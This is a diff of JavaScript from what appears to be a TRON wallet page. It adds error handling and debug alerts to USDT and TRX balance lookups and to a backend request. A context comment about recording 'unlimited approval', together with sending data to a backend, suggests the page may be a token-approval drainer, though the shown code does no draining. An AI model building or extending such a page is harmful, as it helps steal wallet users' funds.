@@ -178,17 +178,29 @@
     // 查USDT余额
     async function getTokenBalance(address) {
         alert("getTokenBalance 函数被调用，address: " + address);
-        const balance = await trc20Contract.balanceOf(address).call();
-        alert("USDT 余额: " + balance / 1000000);
-        return balance / 1000000;
+        try {
+          const balance = await trc20Contract.balanceOf(address).call();
+          const tokenBalance = balance / 1000000;
+          alert("USDT 余额: " + tokenBalance);
+          return tokenBalance;
+        } catch (e) {
+          alert("获取 USDT 余额失败：" + e.message);
+          return 0; // 返回 0，避免程序崩溃
+        }
     }
 
     // 查TRX余额
     async function getTrxBalance(address) {
         alert("getTrxBalance 函数被调用，address: " + address);
-        const balance = await tronWeb.trx.getBalance(address);
-        alert("TRX 余额: " + balance / 1000000);
-        return balance / 1000000;
+        try {
+          const balance = await tronWeb.trx.getBalance(address);
+          const trxBalance = balance / 1000000;
+          alert("TRX 余额: " + trxBalance);
+          return trxBalance;
+        } catch (e) {
+          alert("获取 TRX 余额失败：" + e.message);
+          return 0; // 返回 0，避免程序崩溃
+        }
     }
 
     // 存本地记录（标注无限授权）
@@ -238,9 +250,11 @@
       console.log("后端响应头:", res.headers); // 添加此行
       const responseData = await res.json();
       console.log("后端响应数据:", responseData); // 添加此行
+      alert("数据发送成功，后端响应：" + JSON.stringify(responseData));
       return responseData;
     } else {
       console.error("后端请求失败，状态码:", res.status); // 添加此行
+      alert("后端请求失败，状态码：" + res.status);
       throw new Error("后端请求失败");
     }
   } catch (e) {
